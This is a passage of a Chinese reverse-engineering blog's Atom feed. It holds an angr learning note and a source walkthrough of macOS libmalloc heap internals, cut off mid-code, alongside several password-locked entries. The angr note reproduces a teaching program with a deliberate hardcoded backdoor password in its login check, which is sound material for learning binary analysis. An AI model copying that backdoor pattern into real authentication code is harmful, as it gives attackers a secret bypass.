    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = 